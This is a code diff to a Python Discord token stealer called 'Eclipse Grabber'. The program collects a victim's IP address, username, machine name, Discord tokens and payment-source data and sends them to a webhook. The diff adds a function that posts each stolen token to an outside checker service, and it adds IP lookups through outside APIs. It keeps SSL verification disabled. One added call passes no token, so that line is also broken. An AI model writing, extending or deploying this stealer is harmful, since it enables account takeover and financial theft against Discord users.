@@ -1,16 +1,20 @@
-import os
-import ssl
+import os, ssl
+
 from getpass import getuser
 from json import dumps, loads
 from platform import node as get_pc_name
 from re import findall
+from urllib import request
+from requests import get, post
 from sys import platform as OS
 from typing import List, Optional
 from urllib.request import Request, urlopen
 
 # Constants
 WEBHOOK = "{WEBHOOK}"
-IPIFY_API_URL = "https://api.ipify.org?format=json"
+CHECKER_API_URL = "https://utilities.tk/tokens/check"
+UTILITIES_API_URL = "https://utilities.tk/network/info"
+IPINFO_API_URL = "https://ipinfo.io/json"
 DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
 DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
 DISCORD_BILLING_URL = DISCORD_API_URL + "/billing/payment-sources"
@@ -26,10 +30,16 @@ ssl._create_default_https_context = ssl._create_unverified_context
 
 
 def pc_info():
+    try:
+        ip = get(UTILITIES_API_URL).json()['ip']
+    except:
+        try:
+            ip = get(IPINFO_API_URL).json()['ip']
+        except:
+            ip = "None"
 
-    api_resp = open_url(IPIFY_API_URL)
     return (
-        f'IP: {api_resp.get("ip") if api_resp else None}\n'
+        f'IP: {ip}\n'
         f"Username: {getuser()}\n"
         f"PC Name: {get_pc_name()}\n"
     )
@@ -132,6 +142,18 @@ class Account:
             )
         return info
 
+def check_token(token):
+    r = post(CHECKER_API_URL, json={'token':token})
+    if r.status_code == 200:
+        return f" Valid - '{r.json()['username']}'"
+    elif r.status_code == 429:
+        return " Error"
+    elif r.status_code == 401:
+        return " Invalid"
+    elif r.status_code == 403:
+        return f" Locked - '{r.json()['username']}'"
+    else:
+        return " Error"
 
 def field(title: str, text: str, inline: bool = True) -> str:
 
@@ -149,7 +171,8 @@ def embed_info(accounts: List[Account]) -> List[dict]:
         fields = [
             field("Account", account.account_info()),
             field("PC", pc_info()),
-            field("Token", account.token, False)
+            field("Token", account.token, False),
+            field("Checked", check_token())
         ]
 
         if account.billing_data:
@@ -175,7 +198,7 @@ def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Eclipse Grabber",
+        "username": "Eclipse Gr4bber",
         "avatar_url": "https://imgur.com/Ymo8GEe.png"
     }
 
@@ -223,4 +246,4 @@ def main(WEBHOOK_URL: str):
 
 
 if __name__ == "__main__":
-    main(WEBHOOK) # Run the main function
+    main(WEBHOOK)
